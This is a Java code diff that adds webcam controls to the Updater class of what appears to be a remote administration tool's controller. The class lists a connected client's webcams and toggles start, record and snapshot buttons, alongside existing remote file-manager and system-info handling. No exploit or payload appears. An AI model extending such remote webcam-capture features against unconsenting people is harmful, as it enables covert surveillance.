@@ -2,6 +2,7 @@ package Connections;
 
 import GUI.Main;
 import GUI.TableUtils.FileManager.FileManagerGUI;
+import GUI.TableUtils.Webcam.WebcamManager.WebcamGUI;
 import Information.NetworkInformation;
 import Information.SystemInformation;
 import org.json.JSONArray;
@@ -23,6 +24,8 @@ public class Updater {
     }
 
     private FileManagerGUI fileManagerGUI;
+
+    private WebcamGUI webcamGUI;
 
     private void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
         String operatingSystem = jsonObject.getString("win_ver");
@@ -121,7 +124,47 @@ public class Updater {
                 //         fileManagerGUI.getStream().getClientSocket());
             }
         });
+    }
 
+    private void disableButtons() {
+        webcamGUI.getBoxOfDevices().setEnabled(false);
+        webcamGUI.getStartButton().setEnabled(false);
+        webcamGUI.getRecordButton().setEnabled(false);
+        webcamGUI.getSnapshotButton().setEnabled(false);
+        webcamGUI.getSaveRecordButton().setEnabled(false);
+    }
+
+    private void enableBasicButtons() {
+        webcamGUI.getBoxOfDevices().setEnabled(true);
+        webcamGUI.getStartButton().setEnabled(true);
+        webcamGUI.getRecordButton().setEnabled(false);
+        webcamGUI.getSnapshotButton().setEnabled(false);
+        webcamGUI.getSaveRecordButton().setEnabled(false);
+    }
+
+    private void enableButtons() {
+        if (webcamGUI.getBoxOfDevices().getSelectedIndex() != -1) {
+            enableBasicButtons();
+        } else {
+            disableButtons();
+        }
+    }
+
+    public void updateWebcamDevices(JSONObject jsonObject) {
+        List<Object> listOfWebcams = jsonObject.getJSONArray("list_of_webcams").toList();
+        SwingUtilities.invokeLater(() -> {
+            if (listOfWebcams != null) {
+                if (listOfWebcams.isEmpty()) {
+                    disableButtons();
+                    webcamGUI.getBoxOfDevices().addItem("No webcam found");
+                } else {
+                    for (Object listOfWebcam : listOfWebcams) {
+                        webcamGUI.getBoxOfDevices().addItem((String) listOfWebcam);
+                    }
+                    enableButtons();
+                }
+            }
+        });
 
     }
 
@@ -130,5 +173,7 @@ public class Updater {
         this.fileManagerGUI = fileManagerGUI;
     }
 
-
+    public void setWebcamGUI(WebcamGUI webcamGUI) {
+        this.webcamGUI = webcamGUI;
+    }
 }
